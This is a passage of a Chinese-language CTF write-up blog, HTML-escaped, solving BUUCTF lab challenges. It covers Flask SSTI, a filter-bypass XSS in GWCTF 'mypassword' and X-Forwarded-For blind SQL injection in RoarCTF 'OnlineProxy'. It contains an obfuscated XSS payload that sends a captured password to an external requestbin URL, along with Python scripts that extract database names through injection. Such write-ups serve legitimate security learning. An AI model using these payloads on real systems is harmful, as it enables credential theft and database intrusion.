string&#34;&gt;&#39;.&#39;&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;in&lt;/span&gt; p &lt;span class=&#34;token keyword&#34;&gt;or&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;_&#39;&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;in&lt;/span&gt; p &lt;span class=&#34;token keyword&#34;&gt;or&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;\&#39;&#39;&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;in&lt;/span&gt; p&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;37&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;                    &lt;span class=&#34;token keyword&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;Your nickname contains restricted characters!&#39;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;38&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;                &lt;span class=&#34;token keyword&#34;&gt;return&lt;/span&gt; render_template_string&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;nicknames&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token builtin&#34;&gt;id&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;%&lt;/span&gt; p&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;39&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt; &lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;40&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;        &lt;span class=&#34;token keyword&#34;&gt;except&lt;/span&gt; Exception &lt;span class=&#34;token keyword&#34;&gt;as&lt;/span&gt; e&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;41&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;            &lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;e&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;42&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;            &lt;span class=&#34;token keyword&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;Exception&#39;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;43&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt; &lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;44&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token keyword&#34;&gt;return&lt;/span&gt; render_template&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;index.html&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;45&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt; &lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;46&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;if&lt;/span&gt; __name__ &lt;span class=&#34;token operator&#34;&gt;==&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;__main__&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;47&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    app&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;run&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;host&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;0.0.0.0&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; port&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;1337&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;&lt;img data-src=&#34;../images/%5Bpasecactf_2019%5Dflask_ssti/7.png&#34; alt=&#34;7&#34;&gt;&lt;/p&gt;
&lt;p&gt;给出了 flag 的&lt;img data-src=&#34;../images/%5Bpasecactf_2019%5Dflask_ssti/8.png&#34; alt=&#34;8&#34;&gt; 加密方式，加密后的 flag 存放在 config 中，那将 flag 读取出来再解密就好了&lt;/p&gt;
&lt;p&gt;pyhton 脚本：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;key=&#39;GQIS5EmzfZA1Ci8NslaoMxPXqrvFB7hYOkbg9y20W3&#39;
key2=&#39;xwdFqMck1vA0pl7B8WO3DrGLma4sZ2Y6ouCPEHSQVT&#39;
flag_encoded=&#39;这里放加密后的flag&#39;
flag=&#39;&#39;
for x in range(len(flag_encoded)):
    for i in range(33,127):
        if flag_encoded[x]==chr(x ^ i ^ ord(key[::-1][x]) ^ ord(key2[x])):
            flag+=chr(i)
            print(flag)
            break　
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;img data-src=&#34;../images/%5Bpasecactf_2019%5Dflask_ssti/9.png&#34; alt=&#34;9&#34;&gt;&lt;/p&gt;
&lt;p&gt;参考链接：&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly93d3cuY25ibG9ncy5jb20vMjAxNzUyMTFseXovcC8xMTQyNTM2OC5odG1s&#34;&gt;https://www.cnblogs.com/20175211lyz/p/11425368.html&lt;/span&gt;&lt;/p&gt;

 &lt;h2 id=&#34;gwctf-2019mypassword&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#gwctf-2019mypassword&#34;&gt;#&lt;/a&gt; [GWCTF 2019]mypassword&lt;/h2&gt;
&lt;p&gt;注册登录&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;../images/%5BRoarCTF2019%5DOnlineProxy/1.png&#34; alt=&#34;1&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;../images/%5BRoarCTF2019%5DOnlineProxy/2.png&#34; alt=&#34;2&#34;&gt;&lt;/p&gt;
&lt;p&gt;这里加载了一个 js 文件&lt;br&gt;
&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovLzYwZDQ4N2I0LTA0ZDItNGUzMy05YWFkLWZiZTAyNjRjNWFjNi5ub2RlMy5idXVvai5jbi9qcy9sb2dpbi5qcw==&#34;&gt; 60d487b4-04d2-4e33-9aad-fbe0264c5ac6.node3.buuoj.cn/js/login.js&lt;/span&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;if (document.cookie &amp;amp;&amp;amp; document.cookie != &#39;&#39;) &amp;#123;
	var cookies = document.cookie.split(&#39;; &#39;);
	var cookie = &amp;#123;&amp;#125;;
	for (var i = 0; i &amp;lt; cookies.length; i++) &amp;#123;
		var arr = cookies[i].split(&#39;=&#39;);
		var key = arr[0];
		cookie[key] = arr[1];
	&amp;#125;
	if(typeof(cookie[&#39;user&#39;]) != &amp;quot;undefined&amp;quot; &amp;amp;&amp;amp; typeof(cookie[&#39;psw&#39;]) != &amp;quot;undefined&amp;quot;)&amp;#123;
		document.getElementsByName(&amp;quot;username&amp;quot;)[0].value = cookie[&#39;user&#39;];
		document.getElementsByName(&amp;quot;password&amp;quot;)[0].value = cookie[&#39;psw&#39;];
	&amp;#125;
&amp;#125;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;可以看出，用户名和密码都填入了表单&lt;br&gt;
登录成功后有一个 feedback.php 的用户反馈&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;../images/%5BRoarCTF2019%5DOnlineProxy/4.png&#34; alt=&#34;4&#34;&gt;&lt;/p&gt;
&lt;p&gt;可以看出，用户名和密码都填入了表单&lt;br&gt;
登录成功后有一个 feedback.php 的用户反馈&lt;/p&gt;
&lt;p&gt;在这个页面的源码中存在注释&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;		if(is_array($feedback))&amp;#123;
			echo &amp;quot;&amp;lt;script&amp;gt;alert(&#39;反馈不合法&#39;);&amp;lt;/script&amp;gt;&amp;quot;;
			return false;
		&amp;#125;
		$blacklist = [&#39;_&#39;,&#39;\&#39;&#39;,&#39;&amp;amp;&#39;,&#39;\\&#39;,&#39;#&#39;,&#39;%&#39;,&#39;input&#39;,&#39;script&#39;,&#39;iframe&#39;,&#39;host&#39;,&#39;onload&#39;,&#39;onerror&#39;,&#39;srcdoc&#39;,&#39;location&#39;,&#39;svg&#39;,&#39;form&#39;,&#39;img&#39;,&#39;src&#39;,&#39;getElement&#39;,&#39;document&#39;,&#39;cookie&#39;];
		foreach ($blacklist as $val) &amp;#123;
	        while(true)&amp;#123;
	            if(stripos($feedback,$val) !== false)&amp;#123;
	                $feedback = str_ireplace($val,&amp;quot;&amp;quot;,$feedback);
	            &amp;#125;else&amp;#123;
	                break;
	            &amp;#125;
	        &amp;#125;
	    &amp;#125;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;审计代码可以看出对输入的内容有过滤，但是只是替换为空很容易绕过，例如是 incookieput 的话，替换后会剩下 input。由于 login.js 中有记录密码的功能，所以我们可以构造一个表单在 feedback 页面提交，在 &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovL2h0dHAucmVxdWVzdGJpbi5idXVvai5jbg==&#34;&gt;http://http.requestbin.buuoj.cn&lt;/span&gt; （RequestBin 提供了一个 URL，该 URL 将收集对其发出的请求，首页点击 create a requestbin）页面接收 flag&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;../images/%5BRoarCTF2019%5DOnlineProxy/5.png&#34; alt=&#34;5&#34;&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;poc

&amp;lt;incookieput type=&amp;quot;text&amp;quot; name=&amp;quot;username&amp;quot;&amp;gt;
&amp;lt;incookieput type=&amp;quot;password&amp;quot; name=&amp;quot;password&amp;quot;&amp;gt;
&amp;lt;scrcookieipt scookierc=&amp;quot;./js/login.js&amp;quot;&amp;gt;&amp;lt;/scrcookieipt&amp;gt;
&amp;lt;scrcookieipt&amp;gt;
    var psw = docucookiement.getcookieElementsByName(&amp;quot;password&amp;quot;)[0].value;
    docucookiement.locacookietion=&amp;quot;http://http.requestbin.buuoj.cn/1e8jfct1/?a=&amp;quot;+psw;
&amp;lt;/scrcookieipt&amp;gt;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;img data-src=&#34;../images/%5BRoarCTF2019%5DOnlineProxy/6.png&#34; alt=&#34;6&#34;&gt;&lt;/p&gt;
&lt;p&gt;参考链接：&lt;/p&gt;
&lt;p&gt;[BUUCTF：&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L21vY2h1Nzc3Nzc3Ny9hcnRpY2xlL2RldGFpbHMvMTA1MzQ0NTYz&#34;&gt;GWCTF 2019] mypassword_ctf mypassword-CSDN 博客&lt;/span&gt;&lt;/p&gt;

 &lt;h2 id=&#34;roarctf2019onlineproxy&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#roarctf2019onlineproxy&#34;&gt;#&lt;/a&gt; [RoarCTF2019]OnlineProxy&lt;/h2&gt;
&lt;p&gt;这里发现通过修改 X-FORWARDED-FOR 的值注释部分的内容也随之改变&lt;/p&gt;
&lt;p&gt;尝试盲注，上传命令时第一次为 Current Ip 发现并不能执行，再次上传 Current Ip 时上次的 Current Ip 变为 Last Ip 也没有执行，再次 send 即可正常执行命令&lt;/p&gt;
&lt;p&gt;简单尝试使用盲注得到所有库名，这里可以看到该方法是没问题的&lt;/p&gt;
&lt;p&gt;爆破库名：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;0&#39; or ascii(substr((select(group_concat(schema_name))from(information_schema.schemata)),1,1))&amp;gt;1 or &#39;0
&lt;/code&gt;&lt;/pre&gt;
&lt;pre&gt;&lt;code&gt;import requests

url = &amp;quot;http://node4.buuoj.cn:26869/&amp;quot;
head = &amp;#123;
	&amp;quot;GET&amp;quot; : &amp;quot;/ HTTP/1.1&amp;quot;,
	&amp;quot;Cookie&amp;quot; : &amp;quot;track_uuid=6d033f15-65eb-4a27-a711-76514d4487d5&amp;quot;,
	&amp;quot;X-Forwarded-For&amp;quot; : &amp;quot;&amp;quot;
&amp;#125;
result = &amp;quot;&amp;quot;
for i in range(1,100):
	l = 1
	r = 127
	mid = (l+r)&amp;gt;&amp;gt;1
	while(l&amp;lt;r):
		head[&amp;quot;X-Forwarded-For&amp;quot;] = &amp;quot;0&#39; or ascii(substr((select group_concat(schema_name) from information_schema.schemata),&amp;#123;0&amp;#125;,1))&amp;gt;&amp;#123;1&amp;#125; or &#39;0&amp;quot;.format(i,mid)
		html_0 = requests.post(url,headers = head)
		head[&amp;quot;X-Forwarded-For&amp;quot;] = &amp;quot;0&#39; or ascii(substr((select group_concat(schema_name) from information_schema.schemata),&amp;#123;0&amp;#125;,1))&amp;gt;&amp;#123;1&amp;#125; or &#39;0&amp;quot;.format(i, mid+1)
		html_0 = requests.post(url, headers=head)
		html_0 = requests.post(url, headers=head)
		if &amp;quot;Last Ip: 1&amp;quot; in html_0.text:
			l= mid+1
		else:
			r=mid
		mid = (l+r)&amp;gt;&amp;gt;1
	if(chr(mid)==&#39; &#39;):
		break
	result+=chr(mid)
	print(result)
print(&amp;quot;table_name:&amp;quot;+result)
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;爆破表名：&lt;/p&gt;
&lt;p&gt;爆破表名：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;0&#39; or ascii(substr((select(group_concat(table_name))from(information_schema.tables)where(table_schema=&#39;F4l9_D4t4B45e&#39;)),1,1))&amp;gt;1 or &#39;0
&lt;/code&gt;&lt;/pre&gt;
&lt;pre&gt;&lt;code&gt;import requests

url = &amp;quot;http://node4.buuoj.cn:26869/&amp;quot;
head = &amp;#123;
	&amp;quot;GET&amp;quot; : &amp;quot;/ HTTP/1.1&amp;quot;,
	&amp;quot;Cookie&amp;quot; : &amp;quot;track_uuid=6d033f15-65eb-4a27-a711-76514d4487d5&amp;quot;,
	&amp;quot;X-Forwarded-For&amp;quot; : &amp;quot;&amp;quot;
&amp;#125;
result = &amp;quot;&amp;quot;
urls =&amp;quot;0&#39; or ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=0x46346c395f4434743442343565),&amp;#123;0&amp;#125;,1))&amp;gt;&amp;#123;1&amp;#125; or &#39;0&amp;quot;
for i in range(1,100):
	l = 1
	r = 127
	mid = (l+r)&amp;gt;&amp;gt;1
	while(l&amp;lt;r):
		head[&amp;quot;X-Forwarded-For&amp;quot;] = urls.format(i,mid)
		html_0 = requests.post(url,headers = head)
		head[&amp;quot;X-Forwarded-For&amp;quot;] = urls.format(i, mid+1)
		html_0 = requests.post(url, headers=head)
		html_0 = requests.post(url, headers=head)
		if &amp;quot;Last Ip: 1&amp;quot; in html_0.text:
